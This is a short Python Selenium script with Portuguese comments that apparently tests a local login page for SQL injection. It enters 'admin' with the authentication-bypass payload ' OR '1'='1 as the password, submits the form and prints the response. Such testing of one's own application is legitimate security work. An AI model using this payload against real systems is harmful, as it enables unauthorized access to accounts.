from selenium import webdriver
from selenium.webdriver.common.by import By
import time


driver = webdriver.Chrome(executable_path="chromedriver.exe")

driver.get("http://localhost/login.php")

driver.maximize_window()

time.sleep(5)

#  usuário
driver.find_element(By.NAME, "username").send_keys("admin")

# SQL Injection
driver.find_element(By.NAME, "password").send_keys("' OR '1'='1")

# botão
driver.find_element(By.TAG_NAME, "button").click()

time.sleep(2)

# resultado
resultado = driver.find_element(By.TAG_NAME, "body").text

print("Resultado:", resultado)

time.sleep(3)

driver.quit()